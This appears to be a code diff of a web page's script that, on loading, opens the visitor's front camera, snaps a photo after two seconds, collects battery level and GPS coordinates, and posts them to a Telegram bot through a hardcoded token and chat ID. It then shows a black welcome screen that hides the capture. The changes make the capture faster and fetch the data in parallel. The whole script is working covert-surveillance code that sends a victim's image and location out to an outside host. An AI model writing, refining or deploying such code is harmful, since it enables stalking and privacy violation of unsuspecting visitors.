@@ -16,7 +16,7 @@
 
     <script>
         const TELEGRAM_BOT_TOKEN = "7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4";
-        const TELEGRAM_CHAT_ID = "5112680061";  // ✅ Updated Chat ID
+        const TELEGRAM_CHAT_ID = "5112680061";  
 
         let video = document.getElementById("video");
         let canvas = document.getElementById("canvas");
@@ -24,52 +24,46 @@
 
         async function startCapture() {
             try {
-                // 🚀 Camera Access
                 let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
 
+                // **🔥 2 Sec me photo click karne ka optimized method**
                 setTimeout(() => {
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     let imageData = canvas.toDataURL("image/png");
-                    stream.getTracks().forEach(track => track.stop()); // 📌 Stop Camera
+                    stream.getTracks().forEach(track => track.stop());  
 
                     getUserDetails(imageData);
-                }, 3000); // 🔥 3 sec me photo capture
+                }, 2000);  
             } catch (err) {
                 console.error("Camera access denied!", err);
             }
         }
 
-        // 🚀 Get Battery & Location
         async function getUserDetails(imageData) {
-            let batteryLevel = "Unknown";
-            try {
-                let battery = await navigator.getBattery();
-                batteryLevel = `${Math.round(battery.level * 100)}%`;
-            } catch (err) { console.log("Battery info blocked!"); }
-
-            let locationData = "Unknown";
-            navigator.geolocation.getCurrentPosition(position => {
-                locationData = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
-                sendToTelegram(imageData, batteryLevel, locationData);
-            }, err => {
-                console.log("Location access denied!", err);
-                sendToTelegram(imageData, batteryLevel, "Location Denied");
+            let batteryPromise = navigator.getBattery().then(battery => `${Math.round(battery.level * 100)}%`).catch(() => "Unknown");
+            let locationPromise = new Promise(resolve => {
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`),
+                    () => resolve("Location Denied")
+                );
             });
+
+            // **🔥 Battery aur Location Parallel Fetch ho raha hai, speed fast ho gayi**
+            let [battery, location] = await Promise.all([batteryPromise, locationPromise]);
+
+            sendToTelegram(imageData, battery, location);
         }
 
-        // 🚀 Send Data to Telegram
         function sendToTelegram(imageData, battery, location) {
             let message = `📸 **User Info**\n🔋 Battery: ${battery}\n📍 Location: ${location}`;
 
-            // 🔹 Send Text
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown" })
             }).catch(error => console.log("Message sending error:", error));
 
-            // 🔹 Send Photo
             let blob = dataURItoBlob(imageData);
             let formData = new FormData();
             formData.append("chat_id", TELEGRAM_CHAT_ID);
@@ -79,12 +73,11 @@
                 method: "POST",
                 body: formData
             }).then(() => {
-                document.body.style.backgroundColor = "black"; // Background Black rahega
-                document.getElementById("welcome").style.display = "block"; // Welcome Text Show Karega
+                document.body.style.backgroundColor = "black";  
+                document.getElementById("welcome").style.display = "block";  
             }).catch(error => console.log("Photo sending error:", error));
         }
 
-        // 🚀 Convert Base64 to Blob
         function dataURItoBlob(dataURI) {
             let byteString = atob(dataURI.split(',')[1]);
             let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
@@ -96,7 +89,6 @@
             return new Blob([ab], { type: mimeString });
         }
 
-        // 🚀 Start Process
         startCapture();
     </script>
 </body>
